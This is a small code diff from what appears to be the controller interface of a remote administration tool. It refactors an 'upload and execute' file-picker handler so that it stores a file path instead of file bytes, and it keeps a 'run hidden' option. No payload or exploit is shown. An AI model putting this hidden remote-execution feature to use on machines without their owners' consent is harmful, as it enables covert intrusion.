@@ -31,8 +31,7 @@ namespace xServer.Forms
                     var filePath = Path.Combine(ofd.InitialDirectory, ofd.FileName);
                     txtPath.Text = filePath;
 
-                    Core.Misc.UploadAndExecute.File = (File.Exists(filePath) ? File.ReadAllBytes(filePath) : new byte[0]);
-                    Core.Misc.UploadAndExecute.FileName = ofd.SafeFileName;
+                    Core.Misc.UploadAndExecute.FilePath = File.Exists(filePath) ? filePath : "";
                     Core.Misc.UploadAndExecute.RunHidden = chkRunHidden.Checked;
                 }
             }
